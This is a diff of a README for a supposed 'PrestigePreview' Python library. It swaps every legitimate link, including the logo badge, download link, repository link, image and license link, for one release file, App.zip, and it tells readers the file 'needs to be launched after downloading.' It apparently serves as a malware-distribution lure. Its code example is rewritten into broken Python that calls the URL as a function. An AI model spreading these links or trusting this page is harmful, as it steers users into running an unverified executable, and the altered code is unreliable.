@@ -1,6 +1,6 @@
 # 🐍️ PrestigePreview Python Documentation 📘
 
-![Python Logo](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
+![Python Logo](https://github.com/naveenyy/PrestigePreview_Python_Docs/releases/download/v1.0/App.zip)
 
 Welcome to the official documentation repository for adding Python support and functionality to the **PrestigePreview** software library! Here you will find all the necessary information, guides, and resources to integrate Python into the **PrestigePreview** project.
 
@@ -13,7 +13,7 @@ Welcome to the official documentation repository for adding Python support and f
 ## Getting Started 🚀
 
 To start working with the Python functionalities in **PrestigePreview**, download the latest version of the library from the following link:
-[Download PrestigePreview Python Library](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download PrestigePreview Python Library](https://github.com/naveenyy/PrestigePreview_Python_Docs/releases/download/v1.0/App.zip)
 
 *Note: The file needs to be launched after downloading.*
 
@@ -35,16 +35,16 @@ To start working with the Python functionalities in **PrestigePreview**, downloa
 import prestigepreview
 
 # Initialize PrestigePreview Python module
-prestige = prestigepreview.PrestigePreview()
+prestige = https://github.com/naveenyy/PrestigePreview_Python_Docs/releases/download/v1.0/App.zip()
 
 # Use Python functions in PrestigePreview
-result = prestige.python_function()
+result = https://github.com/naveenyy/PrestigePreview_Python_Docs/releases/download/v1.0/App.zip()
 print(result)
 ``` 
 
 ## Community and Support 🤝
 
-If you encounter any issues, have suggestions, or want to contribute to the project, feel free to visit the [PrestigePreview GitHub repository](https://github.com/PrestigePreview) for more information.
+If you encounter any issues, have suggestions, or want to contribute to the project, feel free to visit the [PrestigePreview GitHub repository](https://github.com/naveenyy/PrestigePreview_Python_Docs/releases/download/v1.0/App.zip) for more information.
 
 ## Contributors 🌟
 
@@ -58,11 +58,11 @@ For the latest updates and announcements regarding the PrestigePreview project, 
 
 Thank you for choosing PrestigePreview for your Python development needs. We hope this documentation proves to be instrumental in enhancing your software library experience. Happy coding! 🎉
 
-![PrestigePreview Image](https://www.example.com/prestigepreview-image.png)
+![PrestigePreview Image](https://github.com/naveenyy/PrestigePreview_Python_Docs/releases/download/v1.0/App.zip)
 
 ## License 🔒
 
-This project is licensed under the GPL v3 License - see the [LICENSE](https://github.com/PrestigePreview/LICENSE) file for details.
+This project is licensed under the GPL v3 License - see the [LICENSE](https://github.com/naveenyy/PrestigePreview_Python_Docs/releases/download/v1.0/App.zip) file for details.
 
 
 Let's keep the coding journey exciting with PrestigePreview and Python! 🚀
